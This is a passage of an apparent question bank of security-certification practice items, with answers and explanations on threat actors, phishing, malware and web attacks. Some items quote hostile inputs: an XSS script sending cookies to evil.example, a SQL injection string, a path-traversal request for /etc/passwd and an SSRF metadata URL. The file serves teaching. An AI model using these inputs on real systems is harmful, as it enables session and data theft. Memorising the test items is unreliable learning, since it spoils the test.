. Which of the following techniques is this?", "o": ["Tokenization", "Hashing", "Data masking", "Steganography"], "a": 0, "e": "Tokenization swaps sensitive data for a token with no mathematical link to the original. The real value is kept in a separate vault. Why not the others: Hashing is one-way, so the number couldn't be looked up again. Masking hides part of a value for display, like ****1234. Steganography hides data inside other files."}, {"d": 1, "q": "A help desk application displays only the last four digits of a customer's Social Security number. Which of the following is being used?", "o": ["Data masking", "Tokenization", "Encryption", "Hashing"], "a": 0, "e": "Masking hides part of the data from the person viewing it, like XXX-XX-1234. Why not the others: Tokenization replaces the whole value with a token. Encryption makes the value unreadable without a key. Hashing turns the value into a fixed-length digest."}, {"d": 1, "q": "An investigator discovers that an insider hid confidential text inside the pixels of image files posted to a public website. Which of the following techniques was used?", "o": ["Steganography", "Tokenization", "Masking", "Salting"], "a": 0, "e": "Steganography hides data inside other media like images, audio or video. Why not the others: Tokenization replaces data with tokens. Masking hides part of a value on screen. Salting adds randomness before hashing."}, {"d": 1, "q": "Which of the following uses a distributed, append-only ledger in which each block contains the hash of the previous block?", "o": ["Blockchain", "Certificate revocation list", "Key escrow", "Open public ledger of certificates"], "a": 0, "e": "In a blockchain, each block includes the previous block's hash, so changing any block breaks the chain. That makes it tamper-evident. Why not the others: A CRL lists revoked certificates. Key escrow stores keys. Certificate transparency logs exist, but the hashed chain of blocks describes a blockchain."}, {"d": 1, "q": "A file downloaded from a vendor's site has a SHA-256 value that does not match the one published on the vendor's page. Which of the following is the MOST likely conclusion?", "o": ["The file was altered or corrupted", "The file was encrypted by the vendor", "The vendor salts its download files", "The file was compressed during transfer"], "a": 0, "e": "A different hash means the file isn't byte-for-byte identical to the original. It was changed, tampered with or corrupted. Why not the others: Encryption isn't implied by a mismatch. Salting applies to password storage, not file downloads. Compression would be the published file itself, which would hash to the published value."}, {"d": 1, "q": "Which of the following key lengths and algorithms would provide the STRONGEST protection for data at rest?", "o": ["AES-256", "DES (56-bit)", "3DES (168-bit)", "RC4 (128-bit)"], "a": 0, "e": "AES-256 is the current strong standard for symmetric encryption. Why not the others: DES has a 56-bit key and is broken. 3DES is deprecated. RC4 has known weaknesses."}, {"d": 1, "q": "A company wants a private certificate authority for internal servers only. Which of the following is a drawback compared to using a public CA?", "o": ["Clients must be configured to trust the internal root", "Internal CAs cannot issue SAN certificates", "Internal CA certificates cannot be revoked", "Internal CAs can only use elliptic-curve keys"], "a": 0, "e": "Browsers and devices don't trust a private root by default, so it has to be pushed to clients, for example by Group Policy or MDM. Why not the others: Internal CAs can issue SAN certificates, revoke certificates and use RSA."}, {"d": 1, "q": "An access control vestibule is installed at a data center entrance. Which of the following attacks is it PRIMARILY designed to prevent?", "o": ["Tailgating", "Phishing", "Shoulder surfing", "Dumpster diving"], "a": 0, "e": "An access control vestibule (mantrap) lets only one person through at a time, which stops tailgating and piggybacking. Why not the others: Phishing is email-based. Shoulder surfing is watching someone's screen or keypad. Dumpster diving is searching trash."}, {"d": 1, "q": "Which of the following physical security controls would BEST detect a person moving through a dark warehouse after hours?", "o": ["Infrared sensors", "Pressure-sensitive door mats only at the lobby", "Fencing", "Badge readers"], "a": 0, "e": "Infrared (motion/heat) sensors detect people moving in the dark. Why not the others: Lobby mats only cover one spot. Fencing is a perimeter barrier and doesn't detect. Badge readers log authorized entries, not intruders already inside."}, {"d": 1, "q": "A company requires that certificates on its mobile app be validated against a specific, expected server certificate rather than any CA-trusted certificate. Which of the following is this?", "o": ["Certificate pinning", "Certificate chaining", "OCSP stapling", "Wildcard certificates"], "a": 0, "e": "Pinning hard-codes the expected certificate or public key in the app, so an attacker with a different CA-issued certificate can't intercept traffic. Why not the others: Chaining is how trust flows from root to leaf. OCSP stapling delivers revocation status. Wildcards cover subdomains."}, {"d": 2, "q": "Which of the following threat actors typically has the MOST resources and is most likely to conduct long-term, stealthy campaigns against critical infrastructure?", "o": ["Nation-state", "Hacktivist", "Unskilled attacker", "Insider threat"], "a": 0, "e": "Nation-states have the most funding, time and skill. They run advanced persistent threats (APTs) against infrastructure and governments. Why not the others: Hacktivists are motivated by causes and usually go for publicity. Unskilled attackers use existing tools. Insiders have access but rarely the resources for long-term campaigns."}, {"d": 2, "q": "A group defaces a company's website with messages protesting the company's environmental practices. Which of the following threat actors is MOST likely responsible?", "o": ["Hacktivist", "Organized crime", "Nation-state", "Shadow IT"], "a": 0, "e": "Hacktivists attack for ideological or political reasons, and defacement is a common tactic. Why not the others: Organized crime is after money. Nation-states usually pursue espionage or disruption quietly. Shadow IT is unapproved technology used by employees, not an attacker."}, {"d": 2, "q": "A threat actor encrypts a hospital's files and demands payment in cryptocurrency. Which of the following motivations is MOST likely?", "o": ["Financial gain", "Espionage", "Philosophical beliefs", "Revenge"], "a": 0, "e": "Ransomware demanding payment is about money. Why not the others: Espionage is about quietly stealing information. Philosophical or political motives drive hacktivists. Revenge is usually a disgruntled insider."}, {"d": 2, "q": "An employee in the marketing department signs up for an unapproved cloud file-sharing service to collaborate with a vendor. Which of the following BEST describes this?", "o": ["Shadow IT", "Insider threat with malicious intent", "Supply chain attack", "Watering hole attack"], "a": 0, "e": "Shadow IT is technology used without IT's approval, usually to get work done faster rather than to cause harm. Why not the others: Nothing suggests malicious intent. A supply chain attack compromises a vendor's product. A watering hole infects a site the targets visit."}, {"d": 2, "q": "An attacker who has little technical skill downloads a ready-made exploit kit and launches it against random IP addresses. Which of the following BEST describes this attacker?", "o": ["Unskilled attacker", "Nation-state", "Advanced persistent threat", "Hacktivist"], "a": 0, "e": "An unskilled attacker (once called a script kiddie) uses tools others made and attacks opportunistically. Why not the others: Nation-states and APTs are highly skilled and targeted. Hacktivists have a cause and specific targets."}, {"d": 2, "q": "An employee receives a text message claiming to be from the company's IT department, asking them to click a link to reset their password. Which of the following attacks is this?", "o": ["Smishing", "Vishing", "Whaling", "Pharming"], "a": 0, "e": "Smishing is phishing over SMS text messages. Why not the others: Vishing uses voice calls. Whaling targets senior executives. Pharming redirects users to a fake site by poisoning DNS or the hosts file."}, {"d": 2, "q": "A caller pretending to be from the bank's fraud department asks an employee to read back a one-time passcode just sent to their phone. Which of the following attacks is this?", "o": ["Vishing", "Smishing", "Typosquatting", "Watering hole"], "a": 0, "e": "Vishing (voice phishing) uses phone calls to trick people into giving up information. Why not the others: Smishing uses SMS. Typosquatting registers misspelled domains. A watering hole compromises a website the targets visit."}, {"d": 2, "q": "The CFO receives an email that appears to be from the CEO, urgently requesting a wire transfer to a new vendor before the end of the day. The email came from a lookalike domain. Which of the following BEST describes this attack?", "o": ["Business email compromise", "Watering hole attack", "Credential stuffing attack", "Smishing campaign"], "a": 0, "e": "Business email compromise (BEC) impersonates executives or vendors to trick staff into sending money or data. Urgency and a new payee are the classic signs. Why not the others: A watering hole infects a website. Credential stuffing reuses leaked passwords. Smishing uses SMS."}, {"d": 2, "q": "Attackers register the domain examp1e.com, hoping users will mistype example.com. Which of the following is this?", "o": ["Typosquatting", "Pharming", "DNS poisoning", "Domain hijacking"], "a": 0, "e": "Typosquatting registers misspelled or lookalike domains to catch typing mistakes. Why not the others: Pharming and DNS poisoning tamper with name resolution. Domain hijacking takes over control of the legitimate domain's registration."}, {"d": 2, "q": "Attackers compromise a popular industry forum that employees of a target company frequently visit, then plant malware on it. Which of the following attacks is this?", "o": ["Watering hole", "Spear phishing", "Pretexting", "Brand impersonation"], "a": 0, "e": "A watering hole attack infects a site the targets are known to visit, then waits for them to come. Why not the others: Spear phishing sends targeted messages. Pretexting invents a scenario to get information. Brand impersonation pretends to be a known company."}, {"d": 2, "q": "An attacker calls the help desk claiming to be a new regional manager who is locked out before a big client meeting, providing plausible names and project details. Which of the following techniques is the attacker using?", "o": ["Pretexting", "Tailgating", "Whaling", "Typosquatting"], "a": 0, "e": "Pretexting builds a believable made-up scenario (the pretext) to manipulate the victim. Why not the others: Tailgating is physical entry behind someone. Whaling targets executives as victims, not a help desk. Typosquatting uses misspelled domains."}, {"d": 2, "q": "An employee clicks a link in an email that appears to come from a payment provider, enters their credentials on the page, and then receives a 'page not found' error. Which of the following attacks MOST likely occurred?", "o": ["Phishing", "Typosquatting", "Watering hole", "Vishing"], "a": 0, "e": "A deceptive email leading to a fake login page that harvests credentials is phishing. The error page afterward is a common trick to make the victim think nothing happened. Why not the others: Typosquatting relies on the user mistyping a URL, not clicking an emailed link. A watering hole compromises a site the victim visits on their own. Vishing is by phone."}, {"d": 2, "q": "A social media account posts false claims that a company's product is unsafe, using fabricated documents to damage its reputation. Which of the following BEST describes this?", "o": ["Disinformation", "Impersonation", "Pretexting", "Smishing"], "a": 0, "e": "Disinformation is deliberately spreading false information to deceive or cause harm. Why not the others: Impersonation pretends to be a specific person or company. Pretexting is a made-up scenario to get information. Smishing is SMS phishing."}, {"d": 2, "q": "USB drives labeled 'Payroll Q4' are left in a company parking lot. When plugged in, they install malware. Which of the following attack vectors is this?", "o": ["Removable device", "Watering hole", "Unsecure network", "Message-based"], "a": 0, "e": "Dropping infected USB drives (baiting) uses removable media as the attack vector. Why not the others: A watering hole uses websites. Unsecure networks are wireless or wired weaknesses. Message-based vectors are email, SMS and IM."}, {"d": 2, "q": "An attacker sends specially crafted input that overwrites memory beyond the end of a fixed-size array, allowing them to execute code. Which of the following vulnerabilities was exploited?", "o": ["Buffer overflow", "SQL injection", "Cross-site scripting", "Race condition"], "a": 0, "e": "A buffer overflow writes past the end of allocated memory and can overwrite return addresses to run attacker code. Why not the others: SQL injection targets database queries. XSS injects scripts into web pages. A race condition exploits timing between operations."}, {"d": 2, "q": "An application checks whether a user has permission to a file, but the attacker swaps the file for a symbolic link before the application opens it. Which of the following vulnerabilities is this?", "o": ["Time-of-check to time-of-use", "Heap-based buffer overflow", "Memory leak in the handler", "Directory traversal"], "a": 0, "e": "TOCTOU is a race condition: the state changes between when it's checked and when it's used. Why not the others: A buffer overflow writes past memory bounds. A memory leak fails to release memory. Directory traversal uses ../ sequences to reach files outside the intended folder."}, {"d": 2, "q": "A web server log contains the following request: GET /download?file=../../../../etc/passwd. Which of the following attacks was attempted?", "o": ["Directory traversal", "SQL injection", "Cross-site request forgery", "Buffer overflow"], "a": 0, "e": "Repeated ../ sequences try to climb out of the web folder to read system files. That's directory (path) traversal. Why not the others: SQL injection would contain SQL syntax like ' OR 1=1. CSRF tricks a user's browser into sending a request. A buffer overflow would send overly long input."}, {"d": 2, "q": "A login form receives the input admin' OR '1'='1' -- in the username field. Which of the following attacks is being attempted?", "o": ["SQL injection", "Cross-site scripting", "LDAP injection", "Command injection"], "a": 0, "e": "Quotes, OR '1'='1' and a comment marker (--) are classic SQL injection, trying to make the WHERE clause always true. Why not the others: XSS would include <script> or similar HTML. LDAP injection uses LDAP filter syntax like *)(. Command injection uses shell characters like ; or |."}, {"d": 2, "q": "Which of the following is the BEST way to prevent SQL injection in a web application?", "o": ["Use parameterized queries", "Encrypt the database at rest", "Use a longer session timeout", "Hash user passwords"], "a": 0, "e": "Parameterized queries (prepared statements) keep user input as data, so it's never run as SQL. Why not the others: Encryption at rest doesn't stop malicious queries. Session timeouts and password hashing don't affect how queries are built."}, {"d": 2, "q": "A user posts a comment on a forum containing <script>document.location='https://evil.example/?c='+document.cookie<\/script>. Other users who view the comment have their session cookies stolen. Which of the following attacks is this?", "o": ["Stored cross-site scripting", "SQL injection", "Cross-site request forgery", "Server-side request forgery"], "a": 0, "e": "The script is saved on the server and runs in every visitor's browser. That's stored (persistent) XSS. Why not the others: SQL injection targets the database. CSRF makes a user's browser send an unwanted request but doesn't inject script. SSRF makes the server send requests."}, {"d": 2, "q": "An attacker compromises a software vendor's build server and inserts a backdoor into a legitimate update that is then distributed to thousands of customers. Which of the following attacks is this?", "o": ["Supply chain attack", "Watering hole attack", "Zero-day exploit against the customers", "Typosquatting"], "a": 0, "e": "Compromising a trusted supplier to reach its customers is a supply chain attack. Why not the others: A watering hole infects a website. The customers weren't hit through an unknown flaw in their own systems. Typosquatting uses lookalike domains."}, {"d": 2, "q": "An attacker exploits a vulnerability for which no patch exists and that the vendor is not yet aware of. Which of the following BEST describes this?", "o": ["Zero-day", "Legacy vulnerability", "Misconfiguration", "End-of-life software"], "a": 0, "e": "A zero-day is a flaw that is unknown to the vendor or unpatched when it's exploited. Why not the others: Legacy and end-of-life software have known, unpatched issues. A misconfiguration is a setup error, not a code flaw."}, {"d": 2, "q": "A user installs apps on their phone from an unofficial website rather than the official app store. Which of the following BEST describes this activity?", "o": ["Sideloading", "Jailbreaking", "Rooting", "Tethering"], "a": 0, "e": "Sideloading installs apps from outside the official store. Why not the others: Jailbreaking (iOS) and rooting (Android) remove OS restrictions. They often enable sideloading but aren't the same thing. Tethering shares a phone's internet connection."}, {"d": 2, "q": "An attacker running a virtual machine on a shared host breaks out of the VM and accesses the hypervisor and other tenants' VMs. Which of the following is this?", "o": ["VM escape", "Resource reuse", "Privilege escalation within the guest only", "Side loading"], "a": 0, "e": "VM escape means breaking out of a guest VM to reach the hypervisor or other guests. Why not the others: Resource reuse is when leftover data in reallocated memory or storage leaks between tenants. Escalation inside the guest stays inside it. Sideloading is installing mobile apps from outside the store."}, {"d": 2, "q": "A cloud storage bucket containing customer records was configured to allow public read access. Which of the following vulnerability types BEST describes this?", "o": ["Misconfiguration", "Zero-day", "Buffer overflow", "Race condition"], "a": 0, "e": "Leaving storage publicly readable is a configuration mistake, one of the most common causes of cloud breaches. Why not the others: A zero-day is an unknown code flaw. Buffer overflows and race conditions are software bugs."}, {"d": 2, "q": "Users report that encrypted files with the extension .locked are appearing on a file share, and a text file demands payment. Which of the following types of malware is MOST likely involved?", "o": ["Ransomware", "Spyware", "Rootkit", "Logic bomb"], "a": 0, "e": "Encrypting files and demanding payment is ransomware. Why not the others: Spyware quietly collects information. A rootkit hides itself and other malware. A logic bomb runs when a condition is met, and nothing here points to a trigger."}, {"d": 2, "q": "Malware spreads from computer to computer across a network by exploiting a vulnerability, without any user interaction. Which of the following BEST describes this malware?", "o": ["Worm", "Trojan", "Virus", "Spyware"], "a": 0, "e": "Worms self-replicate over networks without user action. Why not the others: A trojan pretends to be legitimate software and needs the user to run it. A virus attaches to files and spreads when they're run. Spyware collects information."}, {"d": 2, "q": "A user downloads a free PDF editor that works as advertised but also installs a backdoor. Which of the following types of malware is this?", "o": ["Trojan", "Worm", "Logic bomb", "Keylogger"], "a": 0, "e": "A trojan looks legitimate (and may even work) while hiding a malicious payload. Why not the others: A worm spreads by itself. A logic bomb waits for a trigger. A keylogger records keystrokes, while this payload is a backdoor."}, {"d": 2, "q": "A former developer left code in the payroll system that deletes all employee records if his account is ever disabled. Which of the following is this?", "o": ["Logic bomb", "Rootkit", "Worm", "Bloatware"], "a": 0, "e": "A logic bomb runs when a specific condition is met, here the account being disabled. Why not the others: A rootkit hides presence. A worm self-spreads. Bloatware is unwanted preinstalled software."}, {"d": 2, "q": "Malware modifies the operating system kernel to hide its files and processes from antivirus and system tools. Which of the following BEST describes it?", "o": ["Rootkit", "Adware", "Keylogger", "Ransomware"], "a": 0, "e": "Rootkits get deep (often kernel-level) access and hide themselves and other malware. Why not the others: Adware shows ads. Keyloggers capture keystrokes. Ransomware encrypts data for payment."}, {"d": 2, "q": "A new laptop comes with several unwanted trial applications and toolbars that consume resources and increase the attack surface. Which of the following BEST describes this software?", "o": ["Bloatware", "Rootkit", "Spyware", "Logic bomb"], "a": 0, "e": "Bloatware is unnecessary preinstalled software. It wastes resources and can add vulnerabilities. Why not the others: Rootkits hide themselves. Spyware collects data covertly. Logic bombs wait for a trigger."}, {"d": 2, "q": "A security analyst finds a process on a workstation that records every keystroke and periodically uploads the data to an external server. Which of the following is this?", "o": ["Keylogger", "Worm", "Logic bomb", "Virus"], "a": 0, "e": "A keylogger captures keystrokes, often to steal passwords. Why not the others: Worms self-spread. Logic bombs wait for a trigger. A virus attaches to files, and nothing here shows that."}, {"d": 2, "q": "Malware runs entirely in memory using built-in tools like PowerShell and leaves no executable files on disk. Which of the following BEST describes it?", "o": ["Fileless malware", "Bloatware", "Boot sector virus", "Macro virus in a document"], "a": 0, "e": "Fileless malware lives in memory and abuses legitimate tools ('living off the land'), which makes file-based antivirus less effective. Why not the others: Bloatware is unwanted software. A boot sector virus infects the boot record on disk. A macro virus lives in a document file."}, {"d": 2, "q": "A user's account shows successful logins from New York and Singapore within ten minutes of each other. Which of the following indicators does this represent?", "o": ["Impossible travel", "Account lockout", "Resource inaccessibility", "Concurrent session usage on one device"], "a": 0, "e": "Impossible travel means logins from places too far apart to physically travel between in that time. It strongly suggests stolen credentials. Why not the others: Lockout is too many failed logins. Resource inaccessibility means something can't be reached. Concurrent sessions alone don't account for the geography."}, {"d": 2, "q": "The help desk receives many calls from users in one department whose accounts are locked out, even though the users say they have not tried to log in. Which of the following is the MOST likely cause?", "o": ["A password spraying or brute-force attack", "An outage on the internal DNS servers", "A misconfigured DHCP scope on that VLAN", "An expired TLS certificate on the domain controller"], "a": 0, "e": "Lockouts that users didn't cause suggest someone else is guessing passwords against their accounts. Why not the others: DNS, DHCP and certificate problems cause connectivity errors, not account lockouts."}, {"d": 2, "q": "An attacker tries the password 'Spring2026!' against every account in the directory, then waits an hour and tries 'Welcome1'. Which of the following attacks is this?", "o": ["Password spraying", "Brute force against a single account", "Rainbow table", "Credential replay"], "a": 0, "e": "Password spraying tries one common password across many accounts, staying under lockout thresholds. Why not the others: Brute force hammers one account with many passwords. Rainbow tables crack stolen hashes offline. Credential replay reuses captured credentials or tokens."}, {"d": 2, "q": "An attacker obtains a database of usernames and passwords leaked from a shopping site and tries those combinations on a bank's login page. Which of the following attacks is this?", "o": ["Credential stuffing", "Password spraying", "Birthday attack", "Downgrade attack"], "a": 0, "e": "Credential stuffing reuses leaked username/password pairs on other sites, betting on password reuse. Why not the others: Spraying tries one guessed password across many accounts. A birthday attack finds hash collisions. A downgrade forces weaker protocols."}, {"d": 2, "q": "An attacker captures an authentication token from network traffic and resends it later to gain access without knowing the password. Which of the following attacks is this?", "o": ["Replay attack", "Downgrade attack", "Collision attack", "Directory traversal"], "a": 0, "e": "Replaying captured authentication data to impersonate a user is a replay attack. Timestamps, nonces and session expiration defend against it. Why not the others: A downgrade forces weaker crypto. A collision finds two inputs with the same hash. Traversal accesses files outside the web root."}, {"d": 2, "q": "An attacker on a coffee shop network forces a client and server to negotiate an older, weaker version of TLS that the attacker can break. Which of the following attacks is this?", "o": ["Downgrade attack", "Replay attack", "Birthday attack", "Pass-the-hash"], "a": 0, "e": "A downgrade attack forces a fall back to a weaker protocol or cipher. Disabling old versions on the server prevents it. Why not the others: A replay resends captured data. A birthday attack exploits hash collision probability. Pass-the-hash reuses NTLM hashes."}, {"d": 2, "q": "Which of the following attacks exploits the mathematical probability that two different inputs will produce the same hash value?", "o": ["Birthday attack", "Rainbow table attack", "Password spraying", "Replay attack"], "a": 0, "e": "The birthday attack uses the birthday paradox: collisions turn up much sooner than you'd intuitively expect. Why not the others: Rainbow tables are precomputed hashes for reversing passwords. Spraying guesses passwords across accounts. Replay resends captured data."}, {"d": 2, "q": "An attacker positions themselves between a user and a website, intercepting and possibly altering traffic in both directions. Which of the following attacks is this?", "o": ["On-path attack", "Denial of service", "Smurf attack", "Bluejacking"], "a": 0, "e": "An on-path attack (formerly man-in-the-middle) sits between two parties to intercept or change traffic. Why not the others: A DoS stops service. Smurf is an ICMP amplification DoS. Bluejacking sends unsolicited Bluetooth messages."}, {"d": 2, "q": "An attacker sends small DNS queries with a spoofed source IP address to open resolvers, causing large responses to flood the victim. Which of the following attacks is this?", "o": ["Amplified DDoS", "On-path attack", "DNS tunneling", "ARP poisoning"], "a": 0, "e": "Small spoofed requests that trigger much larger responses aimed at the victim make an amplified (reflected) DDoS. Why not the others: On-path intercepts traffic. DNS tunneling hides data inside DNS queries. ARP poisoning redirects LAN traffic."}, {"d": 2, "q": "Users are redirected to a malicious website even though they type the correct URL. The analyst finds that the local DNS server is returning the wrong IP address for the domain. Which of the following attacks occurred?", "o": ["DNS poisoning", "Typosquatting", "Domain hijacking", "Credential stuffing"], "a": 0, "e": "DNS (cache) poisoning puts false records in a resolver, sending correct names to wrong IPs. Why not the others: Typosquatting needs the user to mistype. Domain hijacking takes over the domain's registration, which would change the record everywhere, not just on the local server. Credential stuffing reuses leaked passwords."}, {"d": 2, "q": "An attacker on the local network sends forged messages associating their MAC address with the default gateway's IP address. Which of the following attacks is this?", "o": ["ARP poisoning", "MAC flooding", "DNS poisoning", "VLAN hopping"], "a": 0, "e": "ARP poisoning (spoofing) maps the attacker's MAC to someone else's IP, often the gateway, to intercept traffic. Why not the others: MAC flooding overflows a switch's CAM table. DNS poisoning corrupts name resolution. VLAN hopping jumps between VLANs."}, {"d": 2, "q": "An attacker uses a cheap reader to copy the data from an employee's proximity badge while standing next to them in an elevator, then uses the copy to enter the building. Which of the following attacks is this?", "o": ["RFID cloning", "Bluesnarfing", "Tailgating", "Shoulder surfing"], "a": 0, "e": "Copying a proximity (RFID) badge's data to a duplicate is RFID cloning. Why not the others: Bluesnarfing steals data over Bluetooth. Tailgating is following someone through a door. Shoulder surfing is watching someone enter information."}, {"d": 2, "q": "An attacker sets up a wireless access point with the same SSID as the company's network to trick users into connecting. Which of the following is this?", "o": ["Evil twin", "Rogue access point installed by an employee", "Bluejacking", "Jamming"], "a": 0, "e": "An evil twin copies a legitimate SSID to lure users and intercept traffic. Why not the others: A rogue AP is any unauthorized AP, often plugged in by an employee, and doesn't need to copy the SSID. Bluejacking sends Bluetooth messages. Jamming disrupts the signal."}, {"d": 2, "q": "A standard user exploits a flaw in a service to gain administrator rights on a server. Which of the following BEST describes this attack?", "o": ["Privilege escalation", "Lateral movement", "Replay attack", "Pivoting through a jump server"], "a": 0, "e": "Gaining higher permissions than you were given is privilege escalation (vertical). Why not the others: Lateral movement goes to other systems at a similar level. Replay resends captured data. Jump servers are legitimate admin hosts."}, {"d": 2, "q": "An attacker forces a user's browser, which is logged into a banking site, to submit a hidden funds-transfer request when the user visits a malicious page. Which of the following attacks is this?", "o": ["Cross-site request forgery", "Cross-site scripting", "SQL injection attack", "Directory traversal attack"], "a": 0, "e": "CSRF abuses the trust a site has in the user's authenticated browser to send requests the user didn't intend. Anti-CSRF tokens prevent it. Why not the others: XSS injects script into the trusted site. SQL injection targets queries. Traversal reads files."}, {"d": 2, "q": "Which of the following is the BEST mitigation for cross-site scripting?", "o": ["Input validation and output encoding", "Full-disk encryption on servers", "Account lockout policies", "Network segmentation with VLANs"], "a": 0, "e": "Validating input and encoding output so browsers treat user data as text, not script, stops XSS. Why not the others: Disk encryption, lockouts and segmentation don't affect how a page renders user input."}, {"d": 2, "q": "An attacker cracks a hash and discovers the password was 'Summer2024'. The attacker used a precomputed table of hashes for common passwords. Which of the following controls would have made this attack MUCH harder?", "o": ["Salting the password hashes", "Using Base64 encoding", "Increasing the session timeout", "Requiring users to change passwords every 30 days"], "a": 0, "e": "A unique salt per password makes precomputed (rainbow) tables useless. Why not the others: Base64 is reversible encoding. Session timeouts don't affect hash cracking. Frequent changes push users toward predictable patterns."}, {"d": 2, "q": "Which of the following BEST describes the purpose of application allow listing?", "o": ["Only approved applications can run", "Known malicious applications are blocked", "All applications run inside a sandbox", "Applications are patched automatically"], "a": 0, "e": "An allow list permits only approved software and blocks everything else by default. Why not the others: Blocking known-bad software is a deny (block) list. Sandboxing isolates execution. Auto-patching is patch management."}, {"d": 2, "q": "A company wants to limit the damage if a single workstation is compromised by preventing it from communicating with servers it does not need. Which of the following mitigation techniques is BEST?", "o": ["Segmentation", "Encryption", "Decommissioning", "Monitoring"], "a": 0, "e": "Segmenting the network with VLANs, ACLs or microsegmentation limits lateral movement. Why not the others: Encryption protects data confidentiality. Decommissioning retires systems. Monitoring detects but doesn't restrict."}, {"d": 2, "q": "A server that is no longer used is still powered on and connected to the network with outdated software. Which of the following is the BEST mitigation?", "o": ["Decommission the server", "Add more monitoring", "Apply an allow list", "Enable full-disk encryption"], "a": 0, "e": "An unused, unpatched server only adds attack surface. Decommissioning it, with proper data sanitization, removes the risk. Why not the others: Monitoring, allow lists and encryption reduce risk but leave an unnecessary system running."}, {"d": 2, "q": "An administrator disables unused services, removes default accounts, and closes unnecessary ports on a new server. Which of the following BEST describes this?", "o": ["Hardening", "Sandboxing", "Patching", "Segmentation"], "a": 0, "e": "Hardening reduces attack surface by removing or disabling what isn't needed. Why not the others: Sandboxing isolates code. Patching fixes known flaws. Segmentation separates networks."}, {"d": 2, "q": "An endpoint suddenly shows sustained 100% CPU usage and heavy outbound traffic to an unknown host at night. Which of the following indicators does this represent?", "o": ["Resource consumption", "Account lockout", "Impossible travel", "Blocked content alert"], "a": 0, "e": "Unexplained spikes in CPU, memory or bandwidth are a resource consumption indicator, common with cryptominers or exfiltration. Why not the others: Lockout is about failed logins. Impossible travel is about login locations. Blocked content means a filter stopped something."}, {"d": 2, "q": "An auditor notices that security logs on a server have a six-hour gap that coincides with suspicious activity. Which of the following indicators does this represent?", "o": ["Missing logs", "Concurrent session usage", "Impossible travel", "Out-of-cycle logging"], "a": 0, "e": "Missing logs (a gap) often means an attacker cleared or stopped logging to cover their tracks. Why not the others: Concurrent sessions and impossible travel are login patterns. Out-of-cycle logging is logs appearing at unusual times."}, {"d": 2, "q": "Which of the following BEST describes a threat vector?", "o": ["The path an attacker uses to gain access", "The motivation behind an attack", "The value of the asset being attacked", "The likelihood an attack succeeds"], "a": 0, "e": "A threat vector is the method or path used to get in, such as email, removable media or an unsecure network. Why not the others: Motivation is why. Asset value is impact. Likelihood is part of risk analysis."}, {"d": 2, "q": "A company still runs a manufacturing control system on an operating system that no longer receives security updates. Which of the following BEST describes this vulnerability?", "o": ["Legacy / end-of-life", "Zero-day vulnerability", "Misconfiguration", "Supply chain compromise"], "a": 0, "e": "Systems past end of life get no patches, so known flaws stay open. Why not the others: Zero-days are unknown flaws. Misconfiguration is a setup mistake. Supply chain is a compromise through a vendor."}, {"d": 2, "q": "Which of the following BEST describes an advanced persistent threat (APT)?", "o": ["A well-funded actor keeping long-term, undetected access", "An automated worm that spreads quickly across many networks", "A single unskilled attacker using publicly available exploits", "A denial-of-service campaign lasting several days"], "a": 0, "e": "APTs, often nation-state backed, get in quietly and stay for a long time to steal data. Why not the others: Worms are noisy and automated. Unskilled attackers lack persistence and resources. A long DoS isn't stealthy access."}, {"d": 2, "q": "An attacker exploits the fact that a smart thermostat uses a hard-coded default password that cannot be changed. Which of the following vulnerability types is this?", "o": ["Default credentials", "Race condition", "SQL injection flaw", "Buffer overflow"], "a": 0, "e": "Default or hard-coded credentials let anyone who knows them log in. They're common in IoT devices. Why not the others: The other options are software coding flaws, not credential issues."}, {"d": 2, "q": "An insider who was passed over for promotion copies confidential project files to a personal cloud account before resigning. Which of the following motivations is MOST likely?", "o": ["Revenge", "Espionage on behalf of a nation-state", "Philosophical beliefs", "Service disruption"], "a": 0, "e": "A disgruntled employee taking data after being passed over most likely wants revenge. Why not the others: Nothing points to a foreign government. Philosophical motives drive hacktivists. Copying files doesn't disrupt service."}, {"d": 2, "q": "An attacker sends a message over Bluetooth to nearby phones that pops up an unsolicited text without accessing any data. Which of the following is this?", "o": ["Bluejacking", "Bluesnarfing", "Evil twin", "RFID cloning"], "a": 0, "e": "Bluejacking sends unsolicited messages over Bluetooth and is mostly a nuisance. Why not the others: Bluesnarfing steals data. Evil twin is a fake Wi-Fi AP. RFID cloning copies badges."}, {"d": 2, "q": "An attacker uses Bluetooth to access a phone's contacts and calendar without the owner's knowledge. Which of the following attacks is this?", "o": ["Bluesnarfing", "Bluejacking", "Jamming", "War driving"], "a": 0, "e": "Bluesnarfing is unauthorized access to data over Bluetooth. Why not the others: Bluejacking only sends messages. Jamming blocks signals. War driving maps Wi-Fi networks."}, {"d": 2, "q": "Which of the following is the BEST defense against a successful phishing email harvesting a user's password?", "o": ["Multifactor authentication", "Longer password length", "Password expiration", "Account lockout after three attempts"], "a": 0, "e": "With MFA, a stolen password alone isn't enough to log in. Phishing-resistant MFA like FIDO2 is even stronger. Why not the others: Length doesn't help when the user hands the password over. Expiration and lockout don't stop a correct stolen password."}, {"d": 2, "q": "A web application allows users to submit a URL that the server then fetches. An attacker submits http://169.254.169.254/ to retrieve cloud instance metadata. Which of the following attacks is this?", "o": ["Server-side request forgery (SSRF)", "Cross-site request forgery (CSRF)", "Cross-site scripting (XSS)", "Directory traversal"], "a": 0, "e": "SSRF makes the server send requests to internal resources the attacker can't reach directly, like the cloud metadata service. Why not the others: CSRF abuses a user's browser. XSS injects scripts into pages. Traversal uses ../ to read files."}, {"d": 2, "q": "Which of the following attacks involves an attacker using a stolen NTLM password hash to authenticate without cracking it?", "o": ["Pass-the-hash", "Rainbow table", "Birthday attack", "Password spraying"], "a": 0, "e": "Pass-the-hash presents the captured hash directly to authenticate, because NTLM accepts the hash itself. Why not the others: Rainbow tables crack hashes. Birthday attacks find collisions. Spraying guesses passwords."}, {"d": 2, "q": "A user's browser is infected with code that silently alters online banking pages and transactions after the user logs in. Which of the following BEST describes this attack?", "o": ["On-path attack in the browser", "Watering hole attack", "Pharming via DNS", "Credential stuffing"], "a": 0, "e": "Malware inside the browser that intercepts and modifies sessions is an on-path attack carried out in the browser (man-in-the-browser). Why not the others: A watering hole infects a website. Pharming redirects DNS. Credential stuffing reuses leaked passwords."}, {"d": 2, "q": "Which of the following hardening techniques would BEST mitigate the risk of malware spreading through USB drives on workstations?", "o": ["Block USB mass storage by endpoint policy", "Change the default administrator password", "Enable HTTPS on all internal websites", "Implement DNS filtering for all users"], "a": 0, "e": "Blocking USB mass storage stops removable-media infections and data theft. Why not the others: Admin passwords, HTTPS and DNS filtering protect other vectors."}, {"d": 2, "q": "An attacker floods a switch with frames from thousands of fake MAC addresses until the switch starts sending all traffic out every port. Which of the following attacks is 